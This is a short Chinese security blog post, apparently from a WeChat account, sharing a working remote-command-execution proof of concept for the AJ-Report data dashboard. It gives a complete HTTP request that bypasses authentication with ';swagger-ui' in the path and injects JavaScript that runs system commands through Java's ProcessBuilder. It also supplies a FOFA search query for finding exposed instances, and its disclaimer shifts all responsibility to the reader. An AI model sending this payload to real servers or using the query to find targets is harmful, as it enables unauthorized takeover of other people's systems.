#  开源数据大屏AJ-Report远程命令执行漏洞   
小白菜安全  小白菜安全   2024-05-22 22:17  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2FI9cW7EPghmK5Qk0wQpoCYlEuqazEKN62mGcAmAHcgySia3NRYSAt5d6tSLLwgSwc9NyzrZ0vwyg/640?wx_fmt=png&from=appmsg "")  
#  漏洞复现  
  
**poc**  
```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/json
Content-Length: 347

{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"whoami\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}

```  
  
  
出现以下信息代表漏洞存在  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia2FI9cW7EPghmK5Qk0wQpoCo0y3eENoWM0O783MO91L6L62fPGS3cP08jSbuX9J39iaX26nphKyicGA/640?wx_fmt=png&from=appmsg "")  
  
# 搜索语法  
  
**fofa：title="AJ-Report"**  
# 寄语  
  
前段时间有些事情导致没更新了，近期会恢复更新。  
  
****  
